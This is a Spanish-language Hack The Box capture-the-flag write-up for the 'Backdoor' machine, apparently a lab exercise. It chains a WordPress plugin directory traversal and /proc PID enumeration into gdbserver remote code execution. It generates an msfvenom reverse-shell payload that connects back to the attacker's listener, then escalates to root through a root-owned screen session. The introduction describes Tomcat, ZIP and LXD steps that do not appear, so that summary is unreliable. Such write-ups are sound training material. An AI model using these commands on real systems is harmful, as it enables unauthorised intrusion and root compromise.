---
category: Hack The Box
tags:
  - eWPT
title: Machine Backdoor
comments: true
image: /assets/img/machines/backdoor/backdoorbanner.jpeg
---
## Introducción

En este _write-up_ abordaremos la resolución de la máquina **Backdoor** de la plataforma Hack The Box. Esta máquina, categorizada con dificultad _Media_, ofrece un escenario realista enfocado en la explotación de una aplicación Tomcat mal configurada, análisis de archivos ZIP protegidos por contraseña, y una escalación de privilegios utilizando contenedores LXD mal gestionados.

## Skills

- LFI to RCE (Abusing /proc/PID/cmdline)
- Gdbserver RCE Vulnerability
- Abusing Screen (Privilege Escalation) [Session synchronization]

## Enumeración
Durante la fase de enumeración, se identificaron tres puertos abiertos: el 22 (SSH), el 80 (HTTP) y el 1337 (servicio personalizado). El escaneo con Nmap reveló que el puerto 80 ejecuta Apache 2.4.41 con un sitio WordPress 5.8.1. 
```bash
❯ nmap -sCV -p 22,80,1337 10.10.11.125

Nmap scan report for 10.10.11.125
Host is up (0.51s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA)
|   256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA)
|_  256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Backdoor &#8211; Real-Life
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-generator: WordPress 5.8.1
1337/tcp open  waste?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 191.18 seconds
```
![1](/assets/img/machines/backdoor/1.jpeg)

Además, al analizar las respuestas del servidor web, se identificó que el dominio `backdoor.htb` está asociado a la IP de la máquina. Por esta razón, se agregó una entrada correspondiente en el archivo `/etc/hosts` para facilitar la navegación y el reconocimiento del entorno web desde el navegador y herramientas de enumeración. Esto también permitió interactuar correctamente con funcionalidades del sitio que dependen del nombre de dominio.

```bash
❯ whatweb http://backdoor.htb
http://backdoor.htb [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], Email[wordpress@example.com], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.125], JQuery[3.6.0], MetaGenerator[WordPress 5.8.1], PoweredBy[WordPress], Script, Title[Backdoor &#8211; Real-Life], UncommonHeaders[link], WordPress[5.8.1]
```


se observó que la ruta `http://backdoor.htb/wp-content/plugins/` está accesible públicamente. Dentro de esta, se encontró un plugin llamado `ebook-download`.
```plaintext
http://backdoor.htb/wp-content/plugins/
```
![2](/assets/img/machines/backdoor/2.jpeg)

Utilizando **Searchsploit**, se identificó que el plugin `ebook-download` es vulnerable a un ataque de **Directory Traversal**. 
![3](/assets/img/machines/backdoor/3.jpeg)

Esta vulnerabilidad permite acceder a archivos arbitrarios del sistema al manipular los parámetros de descarga del plugin, lo que representa un vector claro para acceder a información sensible del servidor.
![4](/assets/img/machines/backdoor/4.jpeg)

## LFI to RCE

Aprovechando la vulnerabilidad de **Directory Traversal** en el plugin `ebook-download`, se logró acceder a archivos sensibles del sistema. Mediante una solicitud `curl` hacia el archivo vulnerable (`filedownload.php`) con el parámetro `ebookdownloadurl` apuntando a `/etc/passwd`.

```bash
❯ curl -s -X GET http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php\?ebookdownloadurl\=/etc/passwd

/etc/passwd/etc/passwd/etc/passwdroot:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
user:x:1000:1000:user:/home/user:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false
<script>window.close()</script>#                 
```

Tras confirmar la vulnerabilidad, se utilizó el mismo vector para filtrar el archivo `/etc/passwd` en busca de usuarios con acceso a una shell válida.
```bash
❯ curl -s -X GET http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php\?ebookdownloadurl\=/etc/passwd | grep "sh$"
/etc/passwd/etc/passwd/etc/passwdroot:x:0:0:root:/root:/bin/bash
user:x:1000:1000:user:/home/user:/bin/bash
```

Con el objetivo de identificar procesos relevantes en el sistema, se desarrolló un script para automatizar la enumeración de rutas en `/proc/[PID]/cmdline` mediante la vulnerabilidad de **directory traversal** previamente encontrada. Utilizando este enfoque, se logró identificar el proceso con **PID 884**, cuyo contenido reveló la ejecución continua de un comando que levanta un servicio `gdbserver` escuchando en el puerto **1337**:
```bash
❯ git clone https://github.com/Indiopicaro/BruteforcePID.git
❯ cd BruteforcePID
❯ python3 BruteForcePID.py -u "http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/PID/cmdline"

============================================================
[+] PID 884 VÁLIDO                                                                                                                                               
[+] URL: http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/884/cmdline                                               
[+] Contenido: /proc/884/cmdline/proc/884/cmdline/proc/884/cmdline/bin/sh-cwhile true;do su user -c "cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;"; done<script>window.close()</script>
============================================================                                                                                                     
```
Este hallazgo confirmó que el puerto 1337, previamente identificado por Nmap como un servicio desconocido (`waste?`), correspondía a una instancia de **gdbserver**.

## Gdbserver

A través de **Searchsploit**, se encontró que `gdbserver` es vulnerable a **Remote Code Execution (RCE)**.
![5](/assets/img/machines/backdoor/5.jpeg)

Se descargó el exploit, el cual aprovecha una vulnerabilidad de ejecución remota de comandos (RCE) en **gdbserver 9.2**. Al ejecutarlo, el script indica los pasos necesarios para su utilización.
```bash
❯ searchsploit -m linux/remote/50539.py
  Exploit: GNU gdbserver 9.2 - Remote Command Execution (RCE)
      URL: https://www.exploit-db.com/exploits/50539
     Path: /usr/share/exploitdb/exploits/linux/remote/50539.py
    Codes: N/A
 Verified: False
File Type: Python script, Unicode text, UTF-8 text executable
Copied to: /home/alex/HTB/backdoor/exploits/50539.py

❯ python3 50539.py

Usage: python3 50539.py <gdbserver-ip:port> <path-to-shellcode>

Example:
- Victim's gdbserver   ->  10.10.10.200:1337
- Attacker's listener  ->  10.10.10.100:4444

1. Generate shellcode with msfvenom:
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.100 LPORT=4444 PrependFork=true -o rev.bin

2. Listen with Netcat:
$ nc -nlvp 4444

3. Run the exploit:
$ python3 50539.py 10.10.10.200:1337 rev.bin
```

Se generó el **shellcode** necesario para obtener una shell inversa utilizando `msfvenom`.
```bash
❯ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.16.3 LPORT=443 PrependFork=true -o rev.bin
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 106 bytes
Saved as: rev.bin
```

Con el archivo `rev.bin` ya generado, se procedió a ejecutar el exploit `50539.py` dirigido al servicio `gdbserver`.
```bash
❯ python3 50539.py 10.10.11.125:1337 rev.bin
[+] Connected to target. Preparing exploit
[+] Found x64 arch
[+] Sending payload
[*] Pwned!! Check your listener
```

En paralelo, se mantenía un listener en el equipo atacante a la espera de la conexión inversa.
```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.11.125] 44748
whoami
user
```

Tras ejecutar el exploit y obtener acceso remoto a la máquina como el usuario `user`, se mejoró la terminal ejecutando `script /dev/null -c bash` para una shell interactiva más estable.
```bash
script /dev/null -c bash
Script started, file is /dev/null
user@Backdoor:/home/user$
user@Backdoor:/home/user$ cat user.txt 
47388d2f9c7d5e9bf1dca6882f9ac95c
```

## Abusing Screen

se realizó una búsqueda de SUID activado para identificar posibles vectores de escalada de privilegios, encontrando varios binarios del sistema con este permiso, incluyendo `screen`. Al inspeccionar los procesos activos, se descubrió un proceso que ejecutaba `screen` como root en un bucle.
```bash
user@Backdoor:/home/user$ cd /
user@Backdoor:/$ find \-perm -4000 2>/dev/null
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/lib/eject/dmcrypt-get-device
./usr/lib/policykit-1/polkit-agent-helper-1
./usr/lib/openssh/ssh-keysign
./usr/bin/passwd
./usr/bin/chfn
./usr/bin/gpasswd
./usr/bin/at
./usr/bin/su
./usr/bin/sudo
./usr/bin/newgrp
./usr/bin/fusermount
./usr/bin/screen
./usr/bin/umount
./usr/bin/mount
./usr/bin/chsh
./usr/bin/pkexec
user@Backdoor:/$ ps -faux | grep screen
root         882  0.0  0.0   2608  1836 ?        Ss   May25   0:37      \_ /bin/sh -c while true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root \;; done
user      258608  0.0  0.0   3304   732 pts/1    S+   03:26   0:00              \_ grep --color=auto screen
```

Aprovechando esto, se adjuntó a esa sesión de `screen` con privilegios de root, logrando así acceso completo al sistema y pudiendo leer la flag de root ubicada en `root.txt`.
```bash
user@Backdoor:/$ screen -x root/
root@Backdoor:~# 
root@Backdoor:~# id
uid=0(root) gid=0(root) groups=0(root) 
root@Backdoor:~# ls                                                        
root.txt                                                                                       
root@Backdoor:~# cat root.txt
2162a07c5cd66714d683b67ec972d65d    
```
